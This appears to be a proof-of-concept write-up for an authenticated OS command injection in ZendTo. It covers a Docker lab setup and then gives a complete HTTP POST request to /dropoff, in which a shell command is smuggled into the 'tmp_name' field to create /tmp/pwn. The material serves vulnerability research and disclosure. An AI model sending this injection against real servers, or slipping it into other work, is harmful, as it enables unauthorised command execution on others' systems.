# ZendTo v5.24-3 <= v6.10-4 Authenticated OS Command Injection

## Lab setup

Build the docker container using the following command:

```
$ docker build -t zendto-container .
$ docker run -d -p 443:443 zendto-container
```

Once done, drop a shell into the container. Your container name might be different, please adjust accordingly.

```
$ docker ps
CONTAINER ID   IMAGE              COMMAND                  CREATED          STATUS          PORTS                               NAMES
858531d955e1   zendto-container   "/entrypoint.sh"         14 minutes ago   Up 14 minutes   0.0.0.0:443->443/tcp                charming_raman

$ docker exec -it charming_raman /bin/bash
```

Next, execute the below commands and follow the prompt (just need to press `Enter`) to complete the installation, you don't need to reboot the box. 

```
root@858531d955e1:/# cd /opt/install.ZendTo/
root@858531d955e1:/opt/install.ZendTo# ./install.sh

[...SNIP...]

Well, it looks like we made it. Yay!

You will need to reboot the server and view the home page once
before going any further.
```

Finally, we will: 

- disable `reCAPTCHA`
- add a ZendTo user
- enable ClamAV

```
root@858531d955e1:/# nano /opt/zendto/config/preferences.php
  'captcha' => '', # Line 573, remove 'google'

root@858531d955e1:/# /opt/zendto/bin/adduser /opt/zendto/config/preferences.php 'jay' 'jay@prjblk.io' 'Jay Ng' 'Prjblk'
root@858531d955e1:/# service clamav-daemon start
```

Once done, we should see port `443` is running on our host machine. To access ZendTo, we might need to add the `docker` host to local dns file on `kali` as below.

```
$ tail -1 /etc/hosts
127.0.0.1       858531d955e1

$ curl -k https://858531d955e1
```

Done :)!. Please note that some parts of the lab won't be fully functional but this is enough to demonstrate our PoC. Any troubles, please send an us an email to icantsetuplab@prjblk.io.

## Exploitation

Send the following request to create a `/tmp/pwn` file.

```
POST /dropoff HTTP/1.1
Host: 858531d955e1
Cookie: zendto-session=[OMITTED]
Content-Length: 2297
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryluj4shZr0G7o5tcO
Origin: https://858531d955e1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive

------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="Action"

dropoff
------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="auth"


------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="req"


------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="senderOrganization"

Prjblk
------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="encryptPassword"


------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="chunkName"

cZwpzbee4knd4jJb3BS7evhVZJxJ8Ssd
------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="subject"

Jay Ng has dropped off files for you
------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="recipName_1"

test
------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="recipEmail_1"

test@prjblk.io
------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="recipient_1"

recipient_id
------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="note"


------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="checksumFiles"

on
------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="confirmDelivery"

on
------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="informRecipients"

on
------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="informPasscode"

on
------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="lifedays"

14
------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="lifeexpiry"

2025-04-01 11:07
------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="desc_1"


------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="file_1"

{"name":"test.php","type":"","size":"34","tmp_name":"1;touch /tmp/pwn;","error":0}
------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="desc_1"


------WebKitFormBoundaryluj4shZr0G7o5tcO
Content-Disposition: form-data; name="sentInChunks"

1
------WebKitFormBoundaryluj4shZr0G7o5tcO--
```
